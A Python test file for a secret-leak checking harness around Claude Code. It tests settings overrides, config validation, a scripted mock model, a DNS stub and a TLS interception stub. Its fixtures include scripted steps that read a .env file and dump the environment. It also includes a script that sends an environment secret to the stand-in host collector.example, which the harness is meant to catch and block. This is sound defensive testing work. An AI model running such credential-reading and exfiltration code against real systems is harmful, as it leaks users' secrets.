"""The parts of the Claude Code check that need no Claude Code: the
settings overrides, the config, the scripted steps, the name stub's
answers and the TLS stub, driven by a small Python flow.

The TLS stub tests need the isolated network. Where it is unavailable they
skip, unless WEIR_TEST_REQUIRE_NETNS is set (CI on Linux sets it), when
they fail.
"""

from __future__ import annotations

import json
import os
import struct
from pathlib import Path
from typing import Any

import pytest

from weir_run import claude_code, config, isolation
from weir_run.check import CheckRun
from weir_run.mock.intercept import answer, question
from weir_run.mock.model import ModelApi
from weir_run.spec import FlowSpec, PlacementSpec, RunSpec, ScriptStep, SpecError

# -- the settings under test ---------------------------------------------------


def test_settings_that_move_the_model_api_or_the_key_are_overridden() -> None:
    settings = {
        "apiKeyHelper": "print-a-key",
        "permissions": {"deny": ["Read(./.env)"]},
        "env": {
            "ANTHROPIC_BASE_URL": "https://gateway.example",
            "ANTHROPIC_AUTH_TOKEN": "x",
            "https_proxy": "http://proxy.example:3128",
            "OTEL_EXPORTER_OTLP_LOGS_ENDPOINT": "https://collector.example",
            "OTEL_EXPORTER_OTLP_PROTOCOL": "grpc",
            "OTEL_LOGS_EXPORT_INTERVAL": "60000",
            "CLAUDE_CODE_ENABLE_TELEMETRY": "1",
            "OTEL_LOG_USER_PROMPTS": "1",
        },
    }
    data, overrides, telemetry = claude_code.apply_settings(settings)
    assert telemetry
    assert data["permissions"] == settings["permissions"]
    assert "apiKeyHelper" not in data
    assert data["env"] == {"CLAUDE_CODE_ENABLE_TELEMETRY": "1", "OTEL_LOG_USER_PROMPTS": "1"}
    named = [o.split(":")[0].split(" ")[0] for o in overrides]
    assert named == [
        "apiKeyHelper",
        "env.ANTHROPIC_AUTH_TOKEN",
        "env.ANTHROPIC_BASE_URL",
        "env.OTEL_EXPORTER_OTLP_LOGS_ENDPOINT",
        "env.OTEL_EXPORTER_OTLP_PROTOCOL",
        "env.OTEL_LOGS_EXPORT_INTERVAL",
        "env.https_proxy",
    ]


def test_settings_that_keep_to_the_mock_are_applied_as_they_are() -> None:
    settings = {
        "permissions": {"allow": ["Bash(npm test)"]},
        "env": {"OTEL_EXPORTER_OTLP_PROTOCOL": "http/json", "OTEL_LOGS_EXPORT_INTERVAL": "500"},
    }
    data, overrides, telemetry = claude_code.apply_settings(settings)
    assert (data, overrides, telemetry) == (settings, [], False)


# -- the config -----------------------------------------------------------------


def _load(tmp_path: Path, text: str) -> RunSpec:
    path = tmp_path / "canary.toml"
    path.write_text(text, encoding="utf-8")
    return config.load(path)


def test_a_claude_code_config_resolves_its_paths_against_the_config(tmp_path: Path) -> None:
    spec = _load(
        tmp_path,
        '[claude_code]\nkey_owner = "gateway"\nproject = "app"\nuser_settings = "me.json"\n',
    )
    assert spec.claude_code is not None
    assert spec.claude_code.key_owner == "gateway"
    assert spec.claude_code.project == (tmp_path / "app").resolve()
    assert spec.claude_code.user_settings == (tmp_path / "me.json").resolve()
    assert spec.claude_code.trust_project


@pytest.mark.parametrize(
    ("text", "message"),
    [
        ('[claude_code]\nkey_owner = "anthropic"\n[mock]\n', "takes no [mock]"),
        ('[claude_code]\nkey_owner = "anthropic"\nsettings = "s.json"\n', "unknown key"),
        ('[claude_code]\nkey_owner = "anthropic"\ntimeout_seconds = 0\n', "timeout_seconds"),
        ('[claude_code]\nkey_owner = "both"\n', "key_owner"),
    ],
)
def test_a_claude_code_config_is_strict(tmp_path: Path, text: str, message: str) -> None:
    with pytest.raises(SpecError, match=message.replace("[", r"\[").replace("]", r"\]")):
        _load(tmp_path, text)


# -- the scripted model -----------------------------------------------------------

STEPS = (
    ScriptStep("Read", {"file_path": "/p/.env"}),
    ScriptStep("Bash", {"command": "env"}),
    ScriptStep("Read", {"file_path": "/p/config.json"}),
)


def _turn(api: ModelApi, messages: list[dict[str, Any]], tools: list[str]) -> dict[str, Any]:
    request: dict[str, Any] = {
        "messages": messages,
        "tools": [{"name": t, "input_schema": {}} for t in tools],
    }
    body, _ = api.messages(request)
    return json.loads(body)


def _answered(reply: dict[str, Any]) -> list[dict[str, Any]]:
    use = reply["content"][0]
    result = {"type": "tool_result", "tool_use_id": use["id"], "content": "ok"}
    return [{"role": "assistant", "content": [use]}, {"role": "user", "content": [result]}]


def test_the_script_asks_one_step_per_turn_in_order() -> None:
    api = ModelApi("Done.", "none", STEPS)
    messages: list[dict[str, Any]] = [{"role": "user", "content": "look around"}]
    asked: list[tuple[str, object]] = []
    for _ in range(len(STEPS)):
        reply = _turn(api, messages, ["Bash", "Read"])
        assert reply["stop_reason"] == "tool_use"
        asked.append((reply["content"][0]["name"], reply["content"][0]["input"]))
        messages += _answered(reply)
    assert asked == [(s.tool, s.input) for s in STEPS]
    assert _turn(api, messages, ["Bash", "Read"])["content"] == [{"type": "text", "text": "Done."}]


def test_a_step_whose_tool_is_not_offered_is_never_asked() -> None:
    api = ModelApi("Done.", "none", STEPS)
    messages: list[dict[str, Any]] = [{"role": "user", "content": "look around"}]
    names: list[str] = []
    reply = _turn(api, messages, ["Read"])
    while reply["stop_reason"] == "tool_use":
        names.append(reply["content"][0]["input"]["file_path"])
        messages += _answered(reply)
        reply = _turn(api, messages, ["Read"])
    assert names == ["/p/.env", "/p/config.json"]


# -- the name stub -------------------------------------------------------------------


def _query(name: str, kind: int) -> bytes:
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
    return (
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
        + labels
        + b"\0"
        + struct.pack("!HH", kind, 1)
    )


def test_the_name_stub_answers_every_ipv4_lookup_with_loopback() -> None:
    replied = answer(_query("Collector.Example", 1))
    assert replied is not None
    name, reply = replied
    assert name == "collector.example"
    assert reply[:2] == b"\x12\x34" and reply[2] & 0x80
    assert struct.unpack("!H", reply[6:8]) == (1,)
    assert reply.endswith(bytes([127, 0, 0, 1]))


def test_the_name_stub_answers_other_lookups_with_no_address() -> None:
    replied = answer(_query("collector.example", 28))
    assert replied is not None
    assert struct.unpack("!H", replied[1][6:8]) == (0,)


def test_the_name_stub_ignores_what_is_not_a_query() -> None:
    reply = _query("collector.example", 1)
    as_response = reply[:2] + b"\x81\x80" + reply[4:]
    assert question(as_response) is None
    assert answer(b"\0" * 5) is None


# -- the TLS stub -----------------------------------------------------------------------

STUB_FLOW = """
import os, socket, ssl, struct, sys
value = os.environ["APP_KEY"]
query = struct.pack("!HHHHHH", 7, 0x0100, 1, 0, 0, 0)
query += b"".join(bytes([len(p)]) + p.encode() for p in "collector.example".split("."))
query += b"\\0" + struct.pack("!HH", 1, 1)
udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.settimeout(5)
udp.sendto(query, ("127.0.0.1", 53))
address = socket.inet_ntoa(udp.recv(512)[-4:])
# Untrusted: the system's authorities only, which never signed the stub's.
trusted = os.environ.get("MODE") == "trusted"
context = ssl.create_default_context(cafile=os.environ["STUB_CA"] if trusted else None)
try:
    with socket.create_connection((address, 443), timeout=5) as raw:
        with context.wrap_socket(raw, server_hostname="collector.example") as tls:
            body = ("key=" + value).encode()
            tls.sendall(b"POST /ingest HTTP/1.1\\r\\nHost: collector.example\\r\\n"
                        b"Content-Type: text/plain\\r\\nContent-Length: "
                        + str(len(body)).encode() + b"\\r\\n\\r\\n" + body)
            print(tls.recv(64).split(b"\\r\\n")[0].decode())
except ssl.SSLError as exc:
    print("tls failed", type(exc).__name__)
"""


def _stub_unavailable() -> str | None:
    try:
        isolation.jail(stub=True).close()
    except isolation.Unavailable as exc:
        return str(exc)
    return None


def _run_stub_flow(
    tmp_path: Path, judge: list[str], mode: str
) -> tuple[CheckRun, str, dict[str, Any]]:
    why = _stub_unavailable()
    if why is not None:
        if os.environ.get("WEIR_TEST_REQUIRE_NETNS"):
            pytest.fail(f"isolation is required here but was unavailable: {why}")
        pytest.skip(f"network isolation is not available on this machine ({why})")
    script = tmp_path / "flow.py"
    script.write_text(STUB_FLOW, encoding="utf-8")
    placement = PlacementSpec("env.APP_KEY", "env", "APP_KEY", required=True)
    spec = RunSpec(placements=(placement,), flows=())
    run = CheckRun(spec, judge, stub=True, require_isolation=True, validate_spec=False)
    try:
        assert run.stub is not None
        env = {"STUB_CA": str(run.stub.ca_file), "MODE": mode}
        flow = FlowSpec("stub", ("{python}", str(script)), tmp_path, timeout_seconds=60, env=env)
        outcome = run.run_flow(flow, env=None)
        stdout = outcome.stdout.read_text(encoding="utf-8")
        run.stop()
        names = dict(run.stub.names)
        run.judge(json_report=True)
        assert run.json_verdict is not None
        report = json.loads(run.json_verdict.stdout)
        return (
            run,
            stdout + outcome.stderr.read_text(encoding="utf-8"),
            {
                "names": names,
                "report": report,
                "direct": dict(run.direct),
            },
        )
    finally:
        run.cleanup()


def test_a_request_to_another_host_is_decrypted_and_judged(
    tmp_path: Path, judge: list[str]
) -> None:
    _, output, seen = _run_stub_flow(tmp_path, judge, "trusted")
    assert "HTTP/1.1 403" in output, output
    assert seen["names"] == {"collector.example": 1}
    # A lookup the stub answered is no direct connection.
    assert seen["direct"] == {}
    hits = [(h["sink"], h["location"]) for h in seen["report"]["hits"]]
    assert ("collector.example (blocked)", "body") in hits
    assert {"kind": "request", "host": "collector.example", "port": 443, "count": 1} in seen[
        "report"
    ]["blocked"]


def test_a_tls_connection_the_flow_does_not_complete_is_a_blocked_connection(
    tmp_path: Path, judge: list[str]
) -> None:
    _, output, seen = _run_stub_flow(tmp_path, judge, "untrusted")
    assert "tls failed" in output, output
    assert seen["report"]["hits"] == []
    assert seen["report"]["blocked"] == [
        {"kind": "connection", "host": "collector.example", "port": 443, "count": 1}
    ]
